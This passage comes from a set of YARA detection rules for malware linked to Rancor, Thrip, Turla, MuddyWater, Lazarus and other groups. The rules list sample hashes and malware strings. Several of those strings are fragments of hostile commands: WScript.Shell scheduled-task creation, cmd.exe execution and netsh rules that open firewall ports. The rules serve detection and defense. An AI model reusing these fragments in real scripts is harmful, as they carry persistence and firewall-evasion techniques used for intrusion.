software\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-06-28 12:22:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash1 = \"10a72f9882fc0ca141e39277222a8d33aab7f7a4b524c109506a407cd10d738c\"\n      tags = \"DEMO, FILE, LINUX, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"number of hash blocks to process at a time (don't set or 0 enables automatic selection o\" fullword ascii\n      $s2 = \"'h' hashrate, 'p' pause, 'r' resume, 'q' shutdown\" fullword ascii\n      $s3 = \"* THREADS:      %d, %s, aes=%d, hf=%zu, %sdonate=%d%%\" fullword ascii\n      $s4 = \".nicehash.com\" ascii\n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 8000KB and ( 1 of ( $x* ) or 2 of them )\n}\n\nrule APT_RANCOR_JS_Malware_RID2E3E : APT DEMO FILE G0075 T1053_005 {\n   meta:\n      description = \"Detects Rancor Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/\"\n      date = \"2018-06-26 11:06:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1dc5966572e94afc2fbcf8e93e3382eef4e4d7b5bc02f24069c403a28fa6a458\"\n      tags = \"APT, DEMO, FILE, G0075, T1053_005\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \",0,0 >%SystemRoot%\\\\system32\\\\spool\\\\drivers\\\\color\\\\fb.vbs\\\",0,0\" fullword ascii\n      $x2 = \"CreateObject(\\\"Wscript.Shell\\\").Run \\\"explorer.exe \\\"\\\"http\" ascii\n      $x3 = \"CreateObject(\\\"Wscript.Shell\\\").Run \\\"schtasks /create\" ascii\n   condition: \n      uint16 ( 0 ) == 0x533c and filesize < 1KB and 1 of them\n}\n\nrule APT_RANCOR_PLAINTEE_Variant_RID2FFF : APT DEMO EXE FILE G0075 T1112 {\n   meta:\n      description = \"Detects PLAINTEE malware\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/\"\n      date = \"2018-06-26 12:21:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6aad1408a72e7adc88c2e60631a6eee3d77f18a70e4eee868623588612efdd31\"\n      hash2 = \"bcd37f1d625772c162350e5383903fe8dbed341ebf0dc38035be5078624c039e\"\n      tags = \"APT, DEMO, EXE, FILE, G0075, T1112\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"payload.dat\" fullword ascii\n      $s3 = \"temp_microsoft_test.txt\" fullword ascii\n      $s4 = \"reg add %s /v %s /t REG_SZ /d \\\"%s\\\"\" fullword ascii\n      $s6 = \"%s %s,helloworld2\" fullword ascii\n      $s9 = \"%s \\\\\\\"%s\\\\\\\",helloworld\" fullword ascii\n      $s16 = \"recv plugin type %s size:%d\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 3 of them\n}\n\nrule APT_RANCOR_PLAINTEE_Malware_Exports_RID3347 : APT DEMO EXE FILE G0075 {\n   meta:\n      description = \"Detects PLAINTEE malware\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/\"\n      date = \"2018-06-26 14:41:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c35609822e6239934606a99cb3dbc925f4768f0b0654d6a2adc35eca473c505d\"\n      tags = \"APT, DEMO, EXE, FILE, G0075\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.6.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and pe.exports ( \"Add\" ) and pe.exports ( \"Sub\" ) and pe.exports ( \"DllEntryPoint\" ) and pe.number_of_exports == 3\n}\n\nrule APT_RANCOR_DDKONG_Malware_Exports_RID32AC : APT DEMO EXE FILE G0075 {\n   meta:\n      description = \"Detects DDKONG malware\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/\"\n      date = \"2018-06-26 14:15:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c35609822e6239934606a99cb3dbc925f4768f0b0654d6a2adc35eca473c505d\"\n      tags = \"APT, DEMO, EXE, FILE, G0075\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.6.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and pe.exports ( \"ServiceMain\" ) and pe.exports ( \"Rundll32Call\" ) and pe.exports ( \"DllEntryPoint\" ) and pe.number_of_exports == 3\n}\n\nrule APT_Thrip_Sample_Jun18_1_RID2FA2 : APT DEMO EXE FILE G0076 {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:05:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"59509a17d516813350fe1683ca6b9727bd96dd81ce3435484a5a53b472ff4ae9\"\n      tags = \"APT, DEMO, EXE, FILE, G0076\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"idocback.dll\" fullword ascii\n      $s2 = \"constructor or from DllMain.\" fullword ascii\n      $s3 = \"appmgmt\" fullword ascii\n      $s4 = \"chksrv\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule APT_Thrip_Sample_Jun18_2_RID2FA3 : APT DEMO EXE FILE G0076 {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:05:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1fc9f7065856cd8dc99b6f46cf0953adf90e2c42a3b65374bf7b50274fb200cc\"\n      tags = \"APT, DEMO, EXE, FILE, G0076\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\WINDOWS\\\\system32\\\\sysprep\\\\cryptbase.dll\" fullword ascii\n      $s2 = \"ProbeScriptFint\" fullword wide\n      $s3 = \"C:\\\\WINDOWS\\\\system32\\\\cmd.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and all of them\n}\n\nrule APT_Thrip_Sample_Jun18_3_RID2FA4 : APT DEMO EXE FILE G0076 {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:05:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0d2abdcaad99e102fdf6574b3dc90f17cb9d060c20e6ac4ff378875d3b91a840\"\n      tags = \"APT, DEMO, EXE, FILE, G0076\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\Windows\\\\SysNative\\\\cmd.exe\" fullword ascii\n      $s2 = \"C:\\\\Windows\\\\SysNative\\\\sysprep\\\\cryptbase.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and all of them\n}\n\nrule APT_Thrip_Sample_Jun18_4_RID2FA5 : APT DEMO EXE FILE G0076 {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:06:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6b236d3fc54d36e6dc2a26299f6ded597058fed7c9099f1a37716c5e4b162abc\"\n      tags = \"APT, DEMO, EXE, FILE, G0076\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\system32\\\\wbem\\\\tmf\\\\caches_version.db\" ascii\n      $s2 = \"ProcessName No Access\" fullword ascii\n      $s3 = \"Hwnd of Process NULL\" fullword ascii\n      $s4 = \"*********The new session is be opening:(%d)**********\" fullword ascii\n      $s5 = \"[EXECUTE]\" fullword ascii\n      $s6 = \"/------------------------------------------------------------------------\" fullword ascii\n      $s7 = \"constructor or from DllMain.\" fullword ascii\n      $s8 = \"Time:%d-%d-%d %d:%d:%d\" fullword ascii\n      $s9 = \"\\\\info.config\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 5 of them\n}\n\nrule APT_Thrip_Sample_Jun18_5_RID2FA6 : APT DEMO EXE FILE G0076 {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:06:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"32889639a27961497d53176765b3addf9fff27f1c8cc41634a365085d6d55920\"\n      tags = \"APT, DEMO, EXE, FILE, G0076\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"c:\\\\windows\\\\USBEvent.exe\" fullword ascii\n      $s5 = \"c:\\\\windows\\\\spdir.dat\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule APT_Thrip_Sample_Jun18_6_RID2FA7 : APT DEMO EXE FILE G0076 {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:06:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"44f58496578e55623713c4290abb256d03103e78e99939daeec059776bd79ee2\"\n      tags = \"APT, DEMO, EXE, FILE, G0076\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\Windows\\\\system32\\\\Instell.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them\n}\n\nrule APT_Thrip_Sample_Jun18_7_RID2FA8 : APT DEMO EXE FILE G0076 {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:06:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6b714dc1c7e58589374200d2c7f3d820798473faeb26855e53101b8f3c701e3f\"\n      tags = \"APT, DEMO, EXE, FILE, G0076\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\runme.exe\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and 1 of them\n}\n\nrule APT_Thrip_Sample_Jun18_8_RID2FA9 : APT DEMO G0076 {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:06:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0f2d09b1ad0694f9e71eeebec5b2d137665375bf1e76cb4ae4d7f20487394ed3\"\n      tags = \"APT, DEMO, G0076\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"$.oS.Run('cmd.exe /c '+a+'\" fullword ascii\n      $x2 = \"new $._x('WScript.Shell');\" ascii\n      $x3 = \".ExpandEnvironmentStrings('%Temp%')+unescape('\" ascii\n   condition: \n      filesize < 10KB and 1 of ( $x* )\n}\n\nrule APT_Thrip_Sample_Jun18_9_RID2FAA : APT DEMO EXE FILE G0076 {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:06:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8e6682bcc51643f02a864b042f7223b157823f3d890fe21d38caeb43500d923e\"\n      hash2 = \"0c8ca0fd0ec246ef207b96a3aac5e94c9c368504905b0a033f11eef8c62fa14c\"\n      hash3 = \"6d0a2c822e2bc37cc0cec35f040d3fec5090ef2775df658d3823e47a93a5fef3\"\n      tags = \"APT, DEMO, EXE, FILE, G0076\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( pe.imphash ( ) == \"a7f0714e82b3105031fa7bc89dfe7664\" or pe.imphash ( ) == \"8812ff21aeb160e8800257140acae54b\" or pe.imphash ( ) == \"44a1e904763fe2d0837c747c7061b010\" or pe.imphash ( ) == \"51a854d285aa12eb82e76e6e1be01573\" or pe.imphash ( ) == \"a1f457c8c549c5c430556bfe5887a4e6\" )\n}\n\nrule APT_Thrip_Sample_Jun18_11_RID2FD3 : APT DEMO EXE FILE G0076 {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:13:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"590a6796b97469f8e6977832a63c0964464901f075a9651f7f1b4578e55bd8c8\"\n      tags = \"APT, DEMO, EXE, FILE, G0076\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"\\\\AppData\\\\Local\\\\Temp\\\\dw20.EXE\" ascii\n      $s2 = \"C:\\\\Windows\\\\system32\\\\sysprep\\\\cryptbase.dll\" fullword ascii\n      $s3 = \"WFQNJMBWF\" fullword ascii\n      $s4 = \"SQLWLWZSF\" fullword ascii\n      $s5 = \"PFQUFQSBPP\" fullword ascii\n      $s6 = \"WQZXQFPVOW\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( pe.imphash ( ) == \"6eef4394490378f32d134ab3bf4bf194\" or all of them )\n}\n\nrule APT_Thrip_Sample_Jun18_13_RID2FD5 : APT DEMO EXE FILE G0076 {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:14:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"780620521c92aab3d592b3dc149cbf58751ea285cfdaa50510002b441796b312\"\n      tags = \"APT, DEMO, EXE, FILE, G0076\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\" fullword ascii\n      $s2 = \"<member><name>password</name>\" fullword ascii\n      $s3 = \"<value><string>qqtorspy</string></value>\" fullword ascii\n      $s4 = \"SOFTWARE\\\\QKitTORSPY\" fullword wide\n      $s5 = \"ipecho.net\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( pe.imphash ( ) == \"3dfad33b2fb66c083c99dc10341908b7\" or 4 of them )\n}\n\nrule APT_Thrip_Sample_Jun18_14_RID2FD6 : APT DEMO EXE FILE G0076 {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:14:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"67dd44a8fbf6de94c4589cf08aa5757b785b26e49e29488e9748189e13d90fb3\"\n      tags = \"APT, DEMO, EXE, FILE, G0076\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $s1 = \"%SystemRoot%\\\\System32\\\\svchost.exe -k \" fullword ascii\n      $s2 = \"spdirs.dll\" fullword ascii\n      $s3 = \"Provides storm installation services such as Publish, and Remove.\" fullword ascii\n      $s4 = \"RegSetValueEx(Svchost\\\\netsvcs)\" fullword ascii\n      $s5 = \"Load %s Error\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( ( pe.exports ( \"InstallA\" ) and pe.exports ( \"InstallB\" ) and pe.exports ( \"InstallC\" ) ) or all of them )\n}\n\nrule APT_Thrip_Sample_Jun18_10_RID2FD2 : APT DEMO EXE FILE G0076 {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:13:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"350d2a6f8e6a4969ffbf75d9f9aae99e7b3a8cd8708fd66f977e07d7fbf842e3\"\n      tags = \"APT, DEMO, EXE, FILE, G0076\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"!This Program cannot be run in DOS mode.\" fullword ascii\n      $x2 = \"!this program cannot be run in dos mode.\" fullword ascii\n      $s1 = \"svchost.dll\" fullword ascii\n      $s2 = \"constructor or from DllMain.\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( $x1 or 2 of them )\n}\n\nrule APT_Thrip_Sample_Jun18_16_RID2FD8 : APT DEMO EXE FILE G0076 {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:14:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2b1c1c6d82837dbbccd171a0413c1d761b1f7c3668a21c63ca06143e731f030e\"\n      tags = \"APT, DEMO, EXE, FILE, G0076\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"[%d] Failed, %08X\" fullword ascii\n      $s2 = \"woqunimalegebi\" fullword ascii\n      $s3 = \"[%d] Offset can not fetched.\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( all of them or pe.imphash ( ) == \"c6a4c95d868a3327a62c9c45f5e15bbf\" )\n}\n\nrule APT_Thrip_Sample_Jun18_17_RID2FD9 : APT DEMO EXE FILE G0076 {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:14:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"05036de73c695f59adf818d3c669c48ce8626139d463b8a7e869d8155e5c0d85\"\n      hash2 = \"08d8c610e1ec4a02364cb53ba44e3ca5d46e8a177a0ecd50a1ef7b5db252701d\"\n      hash3 = \"14535607d9a7853f13e8bf63b629e3a19246ed9db6b4d2de2ca85ec7a7bee140\"\n      tags = \"APT, DEMO, EXE, FILE, G0076\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"c:\\\\users\\\\administrator\\\\desktop\\\\code\\\\skeyman2\\\\\" ascii\n      $x2 = \"\\\\SkeyMan2.pdb\" ascii\n      $x3 = \"\\\\\\\\.\\\\Pnpkb\" fullword ascii\n      $s1 = \"\\\\DosDevices\\\\Pnpkb\" wide\n      $s2 = \"\\\\DosDevices\\\\PnpKb\" wide\n      $s3 = \"\\\\Driver\\\\kbdhid\" wide\n      $s4 = \"\\\\Device\\\\PnpKb\" wide\n      $s5 = \"Microsoft  Windows Operating System\" fullword wide\n      $s6 = \"hDevice == INVALID_HANDLE_VALUE\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and ( 1 of ( $x* ) and 1 of ( $s* ) )\n}\n\nrule APT_Thrip_Sample_Jun18_18_RID2FDA : APT DEMO EXE FILE G0076 {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:14:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"33029f5364209e05481cfb2a4172c6dc157b0070f51c05dd34485b8e8da6e820\"\n      hash2 = \"263c01a3b822722dc288a5ac138d953630d8c548a0bee080ae3979b7d364cecb\"\n      hash3 = \"52d190a8d20b4845551b8765cbd12cfbe04cf23e6812e238e5a5023c34ee9b37\"\n      tags = \"APT, DEMO, EXE, FILE, G0076\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Windows 95/98/Me, Windows NT 4.0, Windows 2000/XP: IME PROCESS key\" fullword ascii\n      $s2 = \"Windows 2000/XP: Either the angle bracket key or the backslash key on the RT 102-key keyboard\" fullword ascii\n      $s3 = \"LoadLibraryA() failed in KbdGetProcAddressByName()\" fullword ascii\n      $s5 = \"Unknown Virtual-Key Code\" fullword ascii\n      $s6 = \"Computer Sleep key\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PLEAD_Downloader_Jun18_1_RID2F6A : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects PLEAD Downloader\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.jpcert.or.jp/2018/06/plead-downloader-used-by-blacktech.html\"\n      date = \"2018-06-16 11:56:11\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a26df4f62ada084a596bf0f603691bc9c02024be98abec4a9872f0ff0085f940\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%02d:%02d:%02d\" ascii fullword\n      $s2 = \"%02d-%02d-%02d\" ascii fullword\n      $s3 = \"1111%02d%02d%02d_%02d%02d2222\" ascii fullword\n      $a1 = \"Scanning...\" wide fullword\n      $a2 = \"Checking...\" wide fullword\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( all of ( $s* ) or ( 2 of ( $s* ) and 1 of ( $a* ) ) )\n}\n\nrule APT_Turla_Agent_BTZ_Gen_1_RID3003 : APT DEMO EXE FILE G0010 GEN RUSSIA {\n   meta:\n      description = \"Detects Turla Agent.BTZ\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-06-16 12:21:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c905f2dec79ccab115ad32578384008696ebab02276f49f12465dcd026c1a615\"\n      tags = \"APT, DEMO, EXE, FILE, G0010, GEN, RUSSIA\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s\" fullword ascii\n      $s1 = \"release mutex - %u (%u)(%u)\" fullword ascii\n      $s2 = \"\\\\system32\\\\win.com\" ascii\n      $s3 = \"Command Id:%u%010u(%02d:%02d:%02d %02d/%02d/%04d)\" fullword ascii\n      $s4 = \"MakeFile Error(%d) copy file to temp file %s\" fullword ascii\n      $s5 = \"%s%%s08x.tmp\" fullword ascii\n      $s6 = \"Run instruction: %d ID:%u%010u(%02d:%02d:%02d %02d/%02d/%04d)\" fullword ascii\n      $s7 = \"Mutex_Log\" fullword ascii\n      $s8 = \"%s\\\\system32\\\\winview.ocx\" fullword ascii\n      $s9 = \"Microsoft(R) Windows (R) Operating System\" fullword wide\n      $s10 = \"Error: pos(%d) > CmdSize(%d)\" fullword ascii\n      $s11 = \"\\\\win.com\" ascii\n      $s12 = \"Error(%d) run %s \" fullword ascii\n      $s13 = \"%02d.%02d.%04d Log begin:\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( pe.imphash ( ) == \"9d0d6daa47d6e6f2d80eb05405944f87\" or ( pe.exports ( \"Entry\" ) and pe.exports ( \"InstallM\" ) and pe.exports ( \"InstallS\" ) ) or $x1 or 3 of them ) or ( 5 of them )\n}\n\nrule APT_NK_AR18_165A_1_RID2C15 : APT DEMO EXE FILE NK T1562_001 {\n   meta:\n      description = \"Detects APT malware from AR18-165A report by US CERT\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/analysis-reports/AR18-165A\"\n      date = \"2018-06-15 09:34:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"089e49de61701004a5eff6de65476ed9c7632b6020c2c0f38bb5761bca897359\"\n      tags = \"APT, DEMO, EXE, FILE, NK, T1562_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"netsh.exe advfirewall firewall add rule name=\\\"PortOpenning\\\" dir=in protocol=tcp localport=%d action=allow enable=yes\" fullword wide\n      $s2 = \"netsh.exe firewall add portopening TCP %d \\\"PortOpenning\\\" enable\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them\n}\n\nrule MAL_MuddyWater_DroppedTask_Jun18_1_RID3395 : APT DEMO FILE G0069 MAL {\n   meta:\n      description = \"Detects a dropped Windows task as used by MudyWater in June 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://app.any.run/tasks/719c94eb-0a00-47cc-b583-ad4f9e25ebdb\"\n      date = \"2018-06-12 14:54:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7ecc2e1817f655ece2bde39b7d6633f4f586093047ec5697a1fab6adc7e1da54\"\n      tags = \"APT, DEMO, FILE, G0069, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%11%\\\\scrobj.dll,NI,c:\" wide\n      $s1 = \"AppAct = \\\"SOFTWARE\\\\Microsoft\\\\Connection Manager\\\"\" fullword wide\n      $s2 = \"[DefenderService]\" fullword wide\n      $s3 = \"UnRegisterOCXs=EventManager\" fullword wide\n      $s4 = \"ShortSvcName=\\\" \\\"\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0xfeff and filesize < 1KB and ( 1 of ( $x* ) or 3 of them )\n}\n\nrule APT_Lazarus_RAT_Jun18_2_RID2F03 : APT DEMO EXE FILE G0032 NK {\n   meta:\n      description = \"Detects Lazarus Group RAT\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/DrunkBinary/status/1002587521073721346\"\n      date = \"2018-06-01 11:39:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e6096fb512a6d32a693491f24e67d772f7103805ad407dc37065cebd1962a547\"\n      tags = \"APT, DEMO, EXE, FILE, G0032, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\KB\\\\Release\\\\\" ascii\n      $s3 = \"KB, Version 1.0\" fullword wide\n      $s4 = \"TODO: (c) <Company name>.  All rights reserved.\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and 2 of them\n}\n\nrule MAL_ELF_VPNFilter_1_RID2D6A : APT DEMO FILE LINUX MAL {\n   meta:\n      description = \"Detects VPNFilter malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-05-24 10:30:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC 